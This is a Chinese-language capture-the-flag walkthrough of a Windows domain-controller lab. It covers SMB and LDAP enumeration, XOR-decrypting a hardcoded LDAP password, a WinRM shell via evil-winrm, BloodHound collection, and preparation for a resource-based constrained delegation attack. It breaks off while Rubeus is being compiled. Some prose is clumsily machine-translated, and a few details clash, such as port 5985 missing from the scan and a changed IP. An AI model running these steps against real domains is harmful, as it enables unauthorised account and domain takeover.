## Support
```
[★]$ nmap 10.129.230.181 -sC -sV
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-29 03:08 CST
Nmap scan report for 10.129.230.181
Host is up (0.0092s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-01-29 09:08:45Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -5s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2026-01-29T09:08:47
|_  start_date: N/A

[★]$ echo '10.129.230.181 support.htb' | sudo tee -a /etc/hosts
```
#### Nmap扫描显示了大量开放端口，其中大多数表明底层操作系统是Windows。的开放的端口有389 （LDAP）、636 （LDAPS）、445 （SMB）和5985（WinRM）。作为没有web服务器在任何端口上监听，因为这是一个Windows系统，让我们检查一下有任何开放的SMB共享可用。
#### Web 服务器不一定只在 80 / 443 端口上提供服务，它可以监听在“任何端口”上
```
[★]$ smbclient -L \\\\10.129.230.181\\
Password for [WORKGROUP\syareya55]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.230.181 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
#### 从可用的共享来看，support-tools似乎很有趣，因为它不是默认共享。让我们试着连接并列出可用文件。
```
[★]$ smbclient \\\\10.129.230.181\\support-tools
Password for [WORKGROUP\syareya55]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul 20 12:01:06 2022
  ..                                  D        0  Sat May 28 06:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 06:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 06:19:55 2022
  putty.exe                           A  1273576  Sat May 28 06:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 06:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 12:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 06:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 06:19:43 2022

		4026367 blocks of size 4096. 959284 blocks available
smb: \> get UserInfo.exe.zip
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (2631.0 KiloBytes/sec) (average 2631.0 KiloBytes/sec)

smb: \> get WiresharkPortable64_3.6.5.paf.exe
getting file \WiresharkPortable64_3.6.5.paf.exe of size 44398000 as WiresharkPortable64_3.6.5.paf.exe (21222.4 KiloBytes/sec) (average 21222.4 KiloBytes/sec)

smb: \> get windirstat1_1_2_setup.exe
getting file \windirstat1_1_2_setup.exe of size 79171 as windirstat1_1_2_setup.exe (1227.2 KiloBytes/sec) (average 1227.2 KiloBytes/sec)

smb: \> exit
```
#### 实际上，我们能够匿名地连接到共享并列出可用的文件。该共享包含很少有应用程序安装程序，如putty或WireShark，但有一个文件脱颖而出。特别zip看起来不像是一个知名的应用程序。让我们将其下载到本地并进行研究进一步。
```
[★]$ unzip UserInfo.exe.zip
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config     
[★]$ file UserInfo.exe
UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
```
#### 检查“UserInfo.exe”的文件类型，发现它是一个。净可执行。因为我们使用的是Linux系统我们有两种方法。反编译可执行文件，看看它做什么或使用Wine尝试运行它。
### ILSpy
#### ILSpy的反编译. Net可执行文件，我们可以使用Avalonia ILspy，这是一个跨平台的版本在Linux上运行的ILSpy。首先让我们从发布页面下载它。
https://github.com/icsharpcode/AvaloniaILSpy
https://github.com/icsharpcode/AvaloniaILSpy/releases
```
[★]$ wget https://github.com/icsharpcode/AvaloniaILSpy/releases/download/v7.2-rc/Linux.x64.Release.zip
[★]$ unzip Linux.x64.Release.zip
Archive:  Linux.x64.Release.zip
  inflating: ILSpy-linux-x64-Release.zip  
[★]$ unzip ILSpy-linux-x64-Release.zip

[★]$ uname -a
Linux htb-yjm93nlfxd 6.12.32-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.32-1parrot1 (2025-06-27) x86_64 GNU/Linux
[★]$ ls artifacts/
linux-x64

[★]$ cd artifacts/linux-x64
[★]$  ./ILSpy  //开启 X11

```
#### 现在让我们加载UserInfo可执行文件，以便对其进行反编译。点击文件，选择打开，找到在文件浏览器中找到目标二进制文件并选择它。
#### 导入二进制文件后，ILSpy将负责反编译，我们将能够查看源代码。看一下代码，我们很快注意到一个名为LdapQuery的函数以及另外两个函数函数FindUser和GetUser。
#### 点击UserInfo.Services->LdapQuery
```
public LdapQuery()
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0022: Expected O, but got Unknown
		//IL_0035: Unknown result type (might be due to invalid IL or missing references)
		//IL_003f: Expected O, but got Unknown
		string password = Protected.getPassword();
		entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
		entry.set_AuthenticationType((AuthenticationTypes)1);
		ds = new DirectorySearcher(entry);
	}
```
#### 点击UserInfo.Services->Protected
```
using System;
using System.Text;

internal class Protected
{
	private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

	private static byte[] key = Encoding.ASCII.GetBytes("armando");

	public static string getPassword()
	{
		byte[] array = Convert.FromBase64String(enc_password);
		byte[] array2 = array;
		for (int i = 0; i < array.Length; i++)
		{
			array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
		}
		return Encoding.Default.GetString(array2);
	}
}
```
#### 通过LDAP服务器进行身份验证的密码是从Protected.getPassword（）中获取的函数。
#### 密码似乎是用异或加密的。解密过程如下：enc密码字符串经过Base64解码并放入字节数组中。创建第二个名为array2的字节数组，其值与array相同。初始化一个循环，循环遍历数组中的每个字符，并用键的一个字母对其进行xor然后是字节0xDFu（223）。最后，返回解密后的密钥。
#### 让我们创建一个执行解密过程的Python脚本
```
[★]$ vi decrypt.py
[★]$ cat decrypt.py
import base64
from itertools import cycle

enc_password = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
key2 = 223

res = ''
for e,k in zip(enc_password, cycle(key)):
    res += chr(e ^ k ^ key2)

print(res)
[★]$ python3 decrypt.py
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```
#### 脚本打印出解密后的密码，我们可以继续连接到LDAP服务器进行收集信息。
### Wine
#### 确定UserInfo.exe功能的第二种方法是使用Wine，这是一个可以运行的应用程序在Linux系统上运行Windows应用程序。
```
[★]$ sudo apt install wine -y
err:mscoree:CLRRuntimeInfo_GetRuntimeHost Wine Mono is not installed //不适合装wine
```
#### 注意：二进制文件实际上是LDAP查询可注入的，但是，这只能通过Windows工作。上述失败可能是由于Wine是一个不完美的软件，并且在某个地方执行二进制文件失败，并且无法识别名称。我们知道二进制连接到并以某种方式进行身份验证，因此让我们启动WireShark并捕获网络流量，看看我们是否可以获取用于身份验证的用户名和密码。启动WireShark，开始抓包tun0接口。然后运行二进制文件

#### 在WireShark中捕获LDAP认证，单击bindRequest包会显示正在使用用户名和密码组合。具体来说，我们可以导航到轻量级目录访问协议，打开protocolOp，然后打开bindRequest以确定用户名支持\ldap。最后，我们可以选择身份验证来查看密码nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz。LDAP身份验证是在WireShark中捕获的，单击bindRequest包会显示正在使用用户名和密码组合。具体来说，我们可以导航到轻量级目录访问协议
```
1️⃣ 打开 Wireshark
2️⃣ 选 tun0
3️⃣ 过滤：tcp.port == 389
4️⃣ 运行：wine UserInfo.exe
5️⃣ 找 bindRequest
6️⃣ 看 authentication
```
#### 最终是为了验证密码，同上的，Wireshark使用不成功，同wine。
### Foothold
#### 获得上述凭据之后，让我们连接到LDAP服务器，看看是否可以找到任何凭据有趣的信息。要连接，我们可以使用ldapsearch实用程序。让我们来安装它。
```
[★]$ sudo apt install ldap-utils
```
#### 安装好实用程序之后，让我们尝试使用ldap@support.htb作为对象绑定到LDAP服务器BindDN带有-D标志，并指定support和hth作为带有-b标志的域组件。
```
//第一步：测试能否 bind
[★]$ ldapsearch -x -H ldap://support.htb \
-D "support\\ldap" \
-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b "dc=support,dc=htb" "(objectClass=*)"

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful  //这里密码
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z

----------------------
//第二步：查管理员
[★]$ ldapsearch -x -H ldap://support.htb \
-D "support\\ldap" \
-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b "dc=support,dc=htb" "(sAMAccountName=Administrator)"
# extended LDIF
#
# LDAPv3
# base <dc=support,dc=htb> with scope subtree
# filter: (sAMAccountName=Administrator)
# requesting: ALL
#

# Administrator, Users, support.htb
dn: CN=Administrator,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: Administrator
description: Built-in account for administering the computer/domain
distinguishedName: CN=Administrator,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528110156.0Z
whenChanged: 20260129090309.0Z
uSNCreated: 8196
memberOf: CN=Group Policy Creator Owners,CN=Users,DC=support,DC=htb
memberOf: CN=Domain Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Enterprise Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Schema Admins,CN=Users,DC=support,DC=htb
memberOf: CN=Administrators,CN=Builtin,DC=support,DC=htb
uSNChanged: 90151
name: Administrator
objectGUID:: ltGa4T+PO0uTHnjAEEcLlw==
userAccountControl: 512

----------------------
//第三步：枚举所有用户
[★]$ ldapsearch -x -H ldap://support.htb \
-D "support\\ldap" \
-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b "dc=support,dc=htb" "(objectClass=user)" sAMAccountName
```
#### 当连接到LDAP服务器时，BindDN可以被视为一种用户名或帐户我们连接到LDAP服务器，并提供查看和编辑LDAP服务器中的对象的权限。另一方面，域组件可以被认为是LDAP中的目录结构。他们是从右到左读取并指示服务器在哪里查找以及为我们获取哪些对象。在这种情况下我们指示服务器转到HTB域组件，找到支持域组件和然后以Administrator的名称搜索其中的任何对象。上面的命令返回
### Apache Directory Studio
#### 除了ldapsearch，我们还可以使用Apache Directory Studio程序，它可以从这里下载。它提供了一个图形界面，可以用来更有效地查看LDAP数据。下载并在本地运行它
https://directory.apache.org/studio/
```
[★]$ gunzip ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar.gz
[~/Downloads][★]$ ls
 ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar
[~/Downloads][★]$ tar -xvf ApacheDirectoryStudio-2.0.0.v20210717-M17-linux.gtk.x86_64.tar
[★]$ cd ApacheDirectoryStudio
[~/Downloads/ApacheDirectoryStudio][★]$ ls
ApacheDirectoryStudio      artifacts.xml  features  LICENSE  p2
ApacheDirectoryStudio.ini  configuration  icon.xpm  NOTICE   plugins
[~/Downloads/ApacheDirectoryStudio][★]$ ./ApacheDirectoryStudio
```
#### 接下来，让我们通过单击屏幕左上角的LDAP按钮来添加到LDAP服务器的连接。
#### LDAP --> New Connetction
![图片](mages/2026013002.png)
#### 输入Support作为连接名称，支持。作为主机名，然后单击Next
```
Bind DN or suer: ldap@support.htb
Bind password:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz  //Ctrl+V
点击Finish
```
#### 在下一个窗口中，确保选择Simple Authentication作为身份验证方法，以“ldap@support.htb”为绑定DN，并粘贴密码为“nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz”在绑定密码字段中。然后单击检查身份验证按钮，以确保一切能正常工作
#### 回到Apache Directory Studio实用程序的主屏幕，我们可以在左下角。双击它将允许我们连接到远程LDAP服务器并列出所有LDAP对象。
```
//会出现的问题,连接超时
Error while opening connection
 -  MSG_04177_CONNECTION_TIMEOUT (5000)
org.apache.directory.studio.connection.core.io.StudioLdapException:  MSG_04177_CONNECTION_TIMEOUT (5000)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.toStudioLdapException(DirectoryApiConnectionWrapper.java:1350)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.access$2(DirectoryApiConnectionWrapper.java:1342)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper$1.run(DirectoryApiConnectionWrapper.java:258)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.runAndMonitor(DirectoryApiConnectionWrapper.java:1261)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.doConnect(DirectoryApiConnectionWrapper.java:280)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper.connect(DirectoryApiConnectionWrapper.java:144)
	at org.apache.directory.studio.connection.core.jobs.OpenConnectionsRunnable.run(OpenConnectionsRunnable.java:111)
	at org.apache.directory.studio.connection.core.jobs.StudioConnectionJob.run(StudioConnectionJob.java:109)
	at org.eclipse.core.internal.jobs.Worker.run(Worker.java:63)
Caused by: org.apache.directory.ldap.client.api.exception.LdapConnectionTimeOutException: MSG_04177_CONNECTION_TIMEOUT (5000)
	at org.apache.directory.ldap.client.api.LdapNetworkConnection.tryConnect(LdapNetworkConnection.java:732)
	at org.apache.directory.ldap.client.api.LdapNetworkConnection.connect(LdapNetworkConnection.java:970)
	at org.apache.directory.studio.connection.core.io.api.DirectoryApiConnectionWrapper$1.run(DirectoryApiConnectionWrapper.java:227)
	... 6 more

 MSG_04177_CONNECTION_TIMEOUT (5000)

安装官方文档的下一步是：在打开DC=support，DC=htb之后，我们注意到一个具有Common Name of users的对象。这个对象包含远程计算机上的所有系统用户。让我们打开它，进一步列举。
在文件夹CN=support  -->’Attribute Description‘:info有密码

同上比较：
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful  //这里密码

info 字段本来常见内容应该是：
“IT Support Account”
“Temporary account”
“Helpdesk user”
```
#### 在用户列表中，有一个似乎很突出，叫做“支持”。查看这个用户的属性，我们发现a非默认标签名为info，值为Ironside47pleasure40Watchful。这看起来很像密码。再往下看，我们还可以看到该用户是Remote Management Users的成员组，允许它们通过WinRM进行连接。为此，让我们尝试使用evil-winrm来连接使用已识别的密码远程联系支持用户。
#### 5985/tcp (WinRM)
```
[★]$ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
*Evil-WinRM* PS C:\Users\support\Documents> cat ../Desktop/user.txt
```
### Privilege Escalation
#### Nmap输出已经向我们揭示了机器属于一个域。我们可以得到更多通过通常预安装的Active Directory powershell模块获取域信息在域控制器上。
```
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADDomain //用来查询当前 Active Directory 域的基本信息；它来自模块：ActiveDirectory（RSAT）


AllowedDNSSuffixes                 : {}
ChildDomains                       : {}
ComputersContainer                 : CN=Computers,DC=support,DC=htb
DeletedObjectsContainer            : CN=Deleted Objects,DC=support,DC=htb
DistinguishedName                  : DC=support,DC=htb
DNSRoot                            : support.htb	//域名，之后用 -d support.htb
DomainControllersContainer         : OU=Domain Controllers,DC=support,DC=htb
DomainMode                         : Windows2016Domain		//2016,安全特性级别
DomainSID                          : S-1-5-21-1677581083-3380853377-188903654
ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=support,DC=htb
Forest                             : support.htb	//林,看是不是单林环境
InfrastructureMaster               : dc.support.htb
LastLogonReplicationInterval       :
LinkedGroupPolicyObjects           : {CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=support,DC=htb}
LostAndFoundContainer              : CN=LostAndFound,DC=support,DC=htb
ManagedBy                          :
Name                               : support
NetBIOSName                        : SUPPORT	//老域名，有些工具用 SUPPORT\user
ObjectClass                        : domainDNS
ObjectGUID                         : 553cd9a3-86c4-4d64-9e85-5146a98c868e
ParentDomain                       :
PDCEmulator                        : dc.support.htb		//主域控,攻它 = 拿整个域
PublicKeyRequiredPasswordRolling   : True
QuotasContainer                    : CN=NTDS Quotas,DC=support,DC=htb
ReadOnlyReplicaDirectoryServers    : {}
ReplicaDirectoryServers            : {dc.support.htb}
RIDMaster                          : dc.support.htb
SubordinateReferences              : {DC=ForestDnsZones,DC=support,DC=htb, DC=DomainDnsZones,DC=support,DC=htb, CN=Configuration,DC=support,DC=htb}
SystemsContainer                   : CN=System,DC=support,DC=htb
UsersContainer                     : CN=Users,DC=support,DC=htb



*Evil-WinRM* PS C:\Users\support\Documents> 

```
#### 添加域控
```
[★]$ sudo sed -i 's/10.129.6.171 support.htb/10.129.6.171 support.htb dc.support.htb/' /etc/hosts
```
#### 我们还可以检查当前用户是否是任何感兴趣的组的成员。
```
*Evil-WinRM* PS C:\Users\support\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
SUPPORT\Shared Support Accounts            Group            S-1-5-21-1677581083-3380853377-188903654-1103 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192
```
#### 看SUPPORT\Shared Support Accounts
#### support用户似乎也是一个名为共享支持帐户的非默认组的成员作为Authenticated Users组。让我们使用BloodHound来识别这个域的潜在攻击路径这可以帮助我们增加特权。首先，让我们安装BloodHound所需的Neo4j数据库。
```
[★]$ sudo neo4j start
Directories in use:
home:         /var/lib/neo4j
config:       /etc/neo4j
logs:         /var/log/neo4j
plugins:      /var/lib/neo4j/plugins
import:       /var/lib/neo4j/import
data:         /var/lib/neo4j/data
certificates: /var/lib/neo4j/certificates
licenses:     /var/lib/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:117720). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```
#### 然后我们可以从发布页面下载预编译的《寻血猎犬》二进制文件。下载了正确的归档为我们的CPU类型，我们可以提取并执行它。
https://github.com/SpecterOps/BloodHound-Legacy/releases
```
[★]$ unzip BloodHound-linux-x64.zip
```
#### 点击登录，把寻血猎犬暂时放在一边，因为我们必须从远程收集数据在我们继续之前。为此，让我们继续在本地克隆BloodHound GitHub项目
https://github.com/SpecterOps/BloodHound-Legacy
```
[★]$ git clone https://github.com/BloodHoundAD/BloodHound
[★]$ ls BloodHound/
Collectors            main.js            server.js
docs                  package.json       src
index.html            package-lock.json  webpack.config.development.js
LICENSE-3RD-PARTY.md  README.md          webpack.config.production.js
LICENSE.md            renderer.js
[★]$ ls BloodHound/Collectors/
AzureHound.md  DebugBuilds  SharpHound.exe  SharpHound.ps1
```
#### 我们将使用SharpHound.exe二进制文件来收集活动目录数据，这些数据可以在BloodHound中找到项目，特别是在BloodHound/Collectors/目录中。我们可以使用之前打开的Evil-WinRM会话来上传它(前提是SharpHound.exe存在于与我们启动Evil-WinRM的文件夹相同)。
```
[~/BloodHound/Collectors][★]$ evil-winrm -u support -p 'Ironside47pleasure40Watchful' -i support.htb                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents> upload SharpHound.exe
                                        
Info: Uploading /home/syareya55/BloodHound/Collectors/SharpHound.exe to C:\Users\support\Documents\SharpHound.exe
                                        
Data: 1395368 bytes of 1395368 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\support\Documents> ./SharpHound.exe
<SNIP>
2026-01-31T00:12:05.3242712-08:00|INFORMATION|SharpHound Enumeration Completed at 12:12 AM on 1/31/2026! Happy Graphing!

```
#### 执行完成后，我们可以看到在同一目录中创建了一个Zip文件
```
*Evil-WinRM* PS C:\Users\support\Documents> dir


    Directory: C:\Users\support\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         1/31/2026  12:12 AM          12357 20260131001204_BloodHound.zip
-a----         1/31/2026  12:10 AM        1046528 SharpHound.exe
-a----         1/31/2026  12:12 AM          10022 YzgyNDA2MjMtMDk1ZC00MGYxLTk3ZjUtMmYzM2MzYzVlOWFi.bin

*Evil-WinRM* PS C:\Users\support\Documents> download 20260131001204_BloodHound.zip
                                        
Info: Downloading C:\Users\support\Documents\20260131001204_BloodHound.zip to 20260131001204_BloodHound.zip
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\support\Documents> exit
                                        
Info: Exiting with code 0
```
#### 下载后，我们只需要将压缩文件拖放到BloodHound窗口中即可加载获得的数据。加载完数据后，我们可以在左上角搜索SUPPORT@SUPPORT.HTB角，以便找到当前用户。然后我们可以右键单击用户对象并选择将用户标记为用来指定我们已经以该用户的身份访问系统。
```
[★]$ cd BloodHound-linux-x64
[~/Downloads/BloodHound-linux-x64][★]$ ls
BloodHound              libGLESv2.so            resources.pak
chrome_100_percent.pak  libvk_swiftshader.so    snapshot_blob.bin
chrome_200_percent.pak  libvulkan.so            swiftshader
chrome-sandbox          LICENSE                 v8_context_snapshot.bin
icudtl.dat              LICENSES.chromium.html  version
libEGL.so               locales                 vk_swiftshader_icd.json
libffmpeg.so            resources
[~/Downloads/BloodHound-linux-x64][★]$ ./BloodHound --no-sandbox --disable-gpu
```
#### 然后就先在浏览器上的本地7474端口输入：账户neo4j 密码neo4j
#### 其次在弹跳出的BloodHound输入：账户neo4j 密码neo4j ，在就点击Upload data上传20260131001204_BloodHound.zip
#### 在BloodHound搜索框输入：SUPPORT@SUPPORT.HTB，双击选择‘！ Mark User as Owned'
#### 我们可以看到组委托对象控制部分显示值为1。该值显示用户所属的组是否有权访问控制对象在域中。让我们点击它来查看更多细节。
#### 'Node Info' -> 'Group Delegated Object Control'
![图片](mages/2026013101.png)
#### 实际上，输出显示Shared Support Accounts组在系统上具有GenericAll特权由于支持用户是该组的成员，因此他们也具有所有权限直流。右键单击GenericAll行并选择Help可提供有关此操作的更多信息特权以及如何利用它。
![图片](mages/2026013102.png)
#### BloodHound提到，由于GenericAll特权，我们可以执行基于资源的约束授权（RBCD）攻击并升级我们的特权。
### Resource Based Constrained Delegation 基于资源的约束授权
https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html
#### 简而言之，通过基于资源的约束委托攻击，我们可以将计算机添加到我们对域的控制；让我们将这台计算机命名为$FAKE-COMP01，并配置域控制器（DC）允许$FAKE-COMP01代表它行动。然后，通过代表DC，我们可以请求Kerberos $FAKE-COMP01的门票，具有在域中冒充高级特权用户的能力，例如署长。生成Kerberos票据后，我们可以传递票据（PtT）并进行身份验证作为这个特权用户，我们可以控制整个域。
```
这种攻击依赖于三个先决条件：
[1]我们需要作为属于Authenticated Users组的域用户执行shell或代码。默认情况下，此组的任何成员最多可以将10台计算机添加到域。
[2]ms-ds-machineaccountquota属性值需要大于0。此属性控制通过身份验证的域用户可以添加到域的计算机数量。
[3]当前用户或用户所属的组需要具有WRITE权限（GenericAll, WriteDACL）通过加入域的计算机（在本例中是域控制器）。
```
#### 从前面的枚举中，我们知道支持用户确实是类的成员认证用户组以及共享支持帐户组。我们也知道共享支持帐户组对域控制器具有GenericAll权限（dc.support.htb）
#### 让我们检查ms-ds-machineaccountquota属性的值。任何 没有其他特殊权限的管理员用户最多可以创建10 个计算机对象（MachineAccountQuota），并为其设置SPN
```
*Evil-WinRM* PS C:\Users\support\Documents> Get-ADObject -Identity ((Get-ADDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota


DistinguishedName         : DC=support,DC=htb
ms-DS-MachineAccountQuota : 10
Name                      : support
ObjectClass               : domainDNS
ObjectGUID                : 553cd9a3-86c4-4d64-9e85-5146a98c868e

//这个域允许普通用户最多创建多少台计算机账户？10台
```
#### 上述命令的输出显示，该属性被设置为10，这意味着每个都经过身份验证域用户最多可以将10台计算机加入域。接下来，让我们验证msds-allowedtoactonbehalfofotheridentity属性是否为空。为此，我们PowerShell需要PowerView模块。我们可以通过Evil-WinRM上传到服务器，如图所示之前。然后我们可以用下面的命令导入它。
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```
[★]$ wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1

*Evil-WinRM* PS C:\Users\support\Documents> upload PowerView.ps1
*Evil-WinRM* PS C:\Users\support\Documents> . ./PowerView.ps1
*Evil-WinRM* PS C:\Users\support\Documents> //一旦模块被导入，我们就可以使用Get-DomainComputer命令来查询所需的信息。

*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer DC | select name, msds-allowedtoactonbehalfofotheridentity

name msds-allowedtoactonbehalfofotheridentity
---- ----------------------------------------
DC


*Evil-WinRM* PS C:\Users\support\Documents>

```
#### 该值为空，这意味着我们准备执行RBCD攻击，但首先让我们上传工具这是必须的。我们将需要PowerMad和Rubeus，我们可以使用Evil-WinRM上传，如图所示之前。PowerMad可以通过以下命令导入。
https://github.com/Kevin-Robertson/Powermad
https://github.com/GhostPack/Rubeus
```
[★]$ git clone https://github.com/Kevin-Robertson/Powermad.git
[★]$ git https://github.com/GhostPack/Rubeus.git
[★]$ ls Powermad/
Invoke-DNSUpdate.ps1  Powermad.ps1   Powermad.psm1
LICENSE               Powermad.psd1  README.md
[★]$ ls Rubeus/
CHANGELOG.md  LICENSE  README.md  Rubeus  Rubeus.sln  Rubeus.yar
//Rubeus.sln 不能在 Evil-WinRM 里编译；只能在你自己的 Windows 编译好，再上传 Rubeus.exe//疯了

打开win11,下载了整个Rubeus压缩包，解压，点击 Rubeus.sln 使用VS2022打开
[1]右键 Rubeus 项目,选择 重新加载项目,选择.NET Framework 4.8
[2]生成 (Build) → 生成解决方案 。生成 exe，Rubeus\bin\Debug\Rubeus.exe

